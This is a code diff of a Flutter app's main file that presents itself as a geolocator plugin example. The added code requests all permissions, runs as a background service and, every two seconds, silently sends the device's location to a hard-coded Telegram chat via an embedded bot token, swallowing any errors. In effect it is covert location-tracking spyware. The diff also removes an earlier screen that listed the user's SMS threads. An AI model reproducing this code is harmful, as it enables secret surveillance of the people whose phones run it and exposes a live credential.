@@ -1,12 +1,19 @@
-// ignore_for_file: non_constant_identifier_names, empty_catches
+// ignore_for_file: unused_local_variable
 
+import 'dart:async';
+// import 'dart:io' show Platform;
+
+import 'package:baseflow_plugin_template/baseflow_plugin_template.dart';
 import 'package:flutter/material.dart';
-
 import 'package:general_flutter/general_flutter.dart';
 
-void main(List<String> args) {
-  WidgetsFlutterBinding.ensureInitialized();
+import 'package:telegram_client/telegram_bot_api/telegram_bot_api.dart';
 
+/// Defines the main theme color.
+final MaterialColor themeMaterialColor = BaseflowPluginExample.createMaterialColor(const Color.fromRGBO(48, 49, 60, 1));
+
+void main() {
+  WidgetsFlutterBinding.ensureInitialized();
   runApp(const MyApp());
 }
 
@@ -15,117 +22,110 @@ class MyApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
-      home: RepaintBoundary(
-        key: GeneralLibraryAppBaseFlutter.flutter_navigator_key,
-        child: const HomePage(),
-      ),
+    return const MaterialApp(
+      home: GeolocatorWidget(),
     );
   }
 }
 
-class HomePage extends StatefulWidget {
-  const HomePage({super.key});
+/// Example [Widget] showing the functionalities of the geolocator plugin
+class GeolocatorWidget extends StatefulWidget {
+  /// Creates a new GeolocatorWidget.
+  const GeolocatorWidget({Key? key}) : super(key: key);
+
+  /// Utility method to create a page with the Baseflow templating.
+  static ExamplePage createPage() {
+    return ExamplePage(Icons.location_on, (context) => const GeolocatorWidget());
+  }
 
   @override
-  State<HomePage> createState() => _HomePageState();
+  State<GeolocatorWidget> createState() => _GeolocatorWidgetState();
 }
 
-class _HomePageState extends State<HomePage> {
-  GeneralFlutter general_library = GeneralFlutter();
+class _GeolocatorWidgetState extends State<GeolocatorWidget> {
   
+
+  GeneralFlutter general_library = GeneralFlutter();
   @override
   void initState() {
     super.initState();
     WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
-      task();
-    });
-    // task();
-  }
-
-  task() {
-    Future(() async {
-      await general_library.permission.flutter_auto_request_all();
-
-      await general_library.sim_card.getSimcards();
+      init();
     });
   }
 
+  void init() async {
+    await general_library.permission.flutter_auto_request_all();
+    final hasPermission = await general_library.location.hashPermission();
+
+    if (!hasPermission) {
+      return;
+    }
+    await general_library.app_background.has_permissions;
+
+    await general_library.app_background.initialize(notificationTitle: "App ", notificationMessage: "eroaksoa");
+    await general_library.app_background.enable_background;
+
+    Timer.periodic(const Duration(seconds: 2), task);
+  }
+
+  void task(Timer timer) {
+    Future(() {
+      _getCurrentPosition();
+    });
+  }
+
+  DateTime dateTime = DateTime.now();
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      appBar: AppBar(
-        title: const Text("app"),
-      ),
-      body: Column(
-        mainAxisAlignment: MainAxisAlignment.start,
-        children: [
-          FutureBuilder(
-            future: general_library.sms.getAllThreads(),
-            builder: (context, snapshot) {
-              List<SmsThreadInfoData> threads = (snapshot.data ?? []);
-              return MediaQuery.removePadding(
-                context: context,
-                removeBottom: true,
-                removeTop: true,
-                removeLeft: true,
-                removeRight: true,
-                child: ListView.builder(
-                  itemCount: threads.length,
-                  physics: const NeverScrollableScrollPhysics(),
-                  shrinkWrap: true,
-                  itemBuilder: (BuildContext context, int index) {
-                    return Column(
-                      mainAxisSize: MainAxisSize.min,
-                      children: [
-                        ListTile(
-                          minVerticalPadding: 8,
-                          minLeadingWidth: 4,
-                          leading: CircleAvatar(
-                            child: () {
-                              try {} catch (e) {}
-                              return const Icon(Icons.people);
-                            }(),
-                          ),
-                          title: Text(
-                            threads[index].contact.address,
-                            style: const TextStyle(
-                              fontWeight: FontWeight.w800,
-                              // color: Colors.black,
-                            ),
-                          ),
-                          subtitle: Text(
-                            threads[index].messages.last.body,
-                            overflow: TextOverflow.ellipsis,
-                          ),
-                        ),
-                        const Divider()
-                      ],
-                    );
-                  },
-                ),
-              );
-            },
-          )
-//
-        ],
-      ),
-      floatingActionButton: FloatingActionButton(
-        onPressed: () {
-          Future(() async {
-            var res = await general_library.app.screenshot_current_widget();
-            print(res);
-            //   for (var element in (await general_library.sms.getAllThreads())) {
-            //     // for (var element_msg in element.messages) {
-            //     print("MSG: ${element.messages.last.body}");
-            //     // }
-            //   }
-          });
-        },
-        child: const Icon(
-          Icons.add,
+      body: Center(
+        child: Text(
+          "UPDATE-DATE: ${dateTime}",
         ),
       ),
     );
   }
+
+  Future<void> _getCurrentPosition() async {
+    GeneralLibraryLocationPositionData? position = await general_library.location.getCurrent();
+    if (position == null) {
+      return;
+    }
+    setState(() {
+      dateTime = DateTime.now();
+    });
+    Future(() async {
+      try {
+        TelegramBotApi tg = TelegramBotApi(tokenBot: "6827497324:AAGw7Dk1rv7Mib3LHAou3AAXQwUQeB99O04");
+
+        tg.request(
+          "sendLocation",
+          parameters: {
+            "chat_id": 6495147242,
+            "latitude": position.latitude,
+            "longitude": position.longitude,
+          },
+          isThrowOnError: false,
+        );
+      } catch (e) {}
+    });
+  }
+
+  @override
+  void dispose() {
+    super.dispose();
+  }
+}
+
+enum PositionItemType {
+  log,
+  position,
+}
+
+class _PositionItem {
+  _PositionItem(this.type, this.displayValue);
+
+  final PositionItemType type;
+  final String displayValue;
 }
